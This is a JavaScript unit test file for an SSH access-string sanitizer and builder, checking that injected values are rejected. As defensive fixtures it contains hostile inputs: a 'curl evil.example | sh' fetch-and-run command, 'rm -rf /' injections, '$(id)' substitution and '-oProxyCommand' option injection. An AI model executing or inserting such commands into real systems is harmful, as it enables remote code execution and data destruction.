// Unit tests for SSH access-string sanitization + construction (ssh-command.js).
// Run: node --test frontend/test/ssh-command.test.mjs
import { test } from 'node:test';
import assert from 'node:assert/strict';

import {
  sanitizeUser,
  sanitizeHost,
  sanitizeKeyPath,
  sanitizePort,
  shellQuote,
  buildSshCommand,
  sshCommandFromNode,
  isSafeSshCommand,
} from '../terminal/js/ssh-command.js';

test('sanitizeUser accepts a unix login and rejects injection', () => {
  assert.equal(sanitizeUser('ubuntu'), 'ubuntu');
  assert.equal(sanitizeUser('root'), 'root');
  assert.equal(sanitizeUser('svc_agent-1'), 'svc_agent-1');
  for (const bad of ['', 'u bu', 'ro;rm', 'a|b', 'a$(b)', '`x`', '-oProxy', "a'b", 'a"b', 'a\nb', null, 42]) {
    assert.equal(sanitizeUser(bad), null, `expected reject: ${JSON.stringify(bad)}`);
  }
});

test('sanitizeHost accepts IPv4/IPv6/DNS and rejects metacharacters', () => {
  assert.equal(sanitizeHost('34.136.10.11'), '34.136.10.11');
  assert.equal(sanitizeHost('node-01.internal.example.com'), 'node-01.internal.example.com');
  assert.equal(sanitizeHost('::1'), '::1');
  assert.equal(sanitizeHost('[2001:db8::10]'), '2001:db8::10');
  for (const bad of ['', 'host name', 'evil;host', 'a|b', 'a$(b)', '$(x)', 'a/b', 'a`b`', 'x@y', 'a\tb']) {
    assert.equal(sanitizeHost(bad), null, `expected reject: ${JSON.stringify(bad)}`);
  }
});

test('sanitizeKeyPath accepts an operator path and rejects flags/metas', () => {
  assert.equal(sanitizeKeyPath('~/.ssh/termini_breakglass'), '~/.ssh/termini_breakglass');
  assert.equal(sanitizeKeyPath('/home/op/keys/termini-key_ed25519'), '/home/op/keys/termini-key_ed25519');
  for (const bad of ['', '/tmp/key with space', '/tmp/k;rm', '-oProxyCommand=evil', '/tmp/k`id`', '~/.ssh/a"b']) {
    assert.equal(sanitizeKeyPath(bad), null, `expected reject: ${JSON.stringify(bad)}`);
  }
});

test('sanitizePort defaults to 22 and validates range', () => {
  assert.equal(sanitizePort(undefined), 22);
  assert.equal(sanitizePort(''), 22);
  assert.equal(sanitizePort('2222'), 2222);
  assert.equal(sanitizePort(22), 22);
  assert.equal(sanitizePort(0), null);
  assert.equal(sanitizePort(70000), null);
  assert.equal(sanitizePort('abc'), null);
});

test('buildSshCommand renders the frozen format', () => {
  assert.equal(
    buildSshCommand({ user: 'ubuntu', host: '34.136.10.11', port: 22, keyPath: '~/.ssh/termini_breakglass' }),
    'ssh -i ~/.ssh/termini_breakglass ubuntu@34.136.10.11',
  );
  // non-default port gets -p; default 22 is omitted
  assert.equal(
    buildSshCommand({ user: 'ubuntu', host: 'host.example.com', port: 2222, keyPath: '/k' }),
    'ssh -i /k -p 2222 ubuntu@host.example.com',
  );
  // IPv6 is bracketed
  assert.equal(
    buildSshCommand({ user: 'ubuntu', host: '2001:db8::10', port: 22, keyPath: '~/.ssh/k' }),
    'ssh -i ~/.ssh/k ubuntu@[2001:db8::10]',
  );
});

test('buildSshCommand throws on any unsafe part (no injection)', () => {
  const base = { user: 'ubuntu', host: 'h.example', port: 22, keyPath: '~/.ssh/k' };
  assert.throws(() => buildSshCommand({ ...base, user: 'u; rm -rf /' }), /unsafe SSH user/);
  assert.throws(() => buildSshCommand({ ...base, host: 'h $(id)' }), /unsafe SSH host/);
  assert.throws(() => buildSshCommand({ ...base, keyPath: '-oProxyCommand=x' }), /unsafe SSH key path/);
  assert.throws(() => buildSshCommand({ ...base, port: 99999 }), /invalid SSH port/);
});

test('sshCommandFromNode rebuilds from fields and ignores the server command', () => {
  const payload = {
    node_id: 'n1',
    user: 'ubuntu',
    host: '34.136.10.11',
    port: 22,
    key_algorithm: 'ed25519',
    key_fingerprint: 'SHA256:abc==',
    key_comment: 'termini-breakglass',
    // hostile / divergent server-computed value must NOT be surfaced:
    command: 'ssh -i /k ubuntu@34.136.10.11; curl evil.example | sh',
  };
  const model = sshCommandFromNode(payload, { keyPath: '~/.ssh/termini_breakglass' });
  assert.equal(model.command, 'ssh -i ~/.ssh/termini_breakglass ubuntu@34.136.10.11');
  assert.equal(model.keyFingerprint, 'SHA256:abc==');
  assert.equal(model.keyAlgorithm, 'ed25519');
  assert.equal(model.keyComment, 'termini-breakglass');
});

test('sshCommandFromNode uses the default key path when none is given', () => {
  const model = sshCommandFromNode({ user: 'ubuntu', host: '10.0.0.1', port: 22 });
  assert.equal(model.command, 'ssh -i ~/.ssh/termini_breakglass ubuntu@10.0.0.1');
});

test('sshCommandFromNode throws on a poisoned host field', () => {
  assert.throws(
    () => sshCommandFromNode({ user: 'ubuntu', host: 'x; rm -rf /', port: 22 }),
    /unsafe SSH host/,
  );
});

test('isSafeSshCommand accepts built commands and rejects injected ones', () => {
  assert.equal(isSafeSshCommand('ssh -i ~/.ssh/k ubuntu@34.136.10.11'), true);
  assert.equal(isSafeSshCommand('ssh -i /k -p 2222 ubuntu@[2001:db8::1]'), true);
  assert.equal(isSafeSshCommand('ssh -i /k ubuntu@host; rm -rf /'), false);
  assert.equal(isSafeSshCommand('rm -rf /'), false);
  assert.equal(isSafeSshCommand('ssh -i /k ubuntu@host | sh'), false);
});

test('shellQuote is POSIX-correct for values with single quotes', () => {
  assert.equal(shellQuote('plain'), "'plain'");
  assert.equal(shellQuote("a'b"), "'a'\\''b'");
});
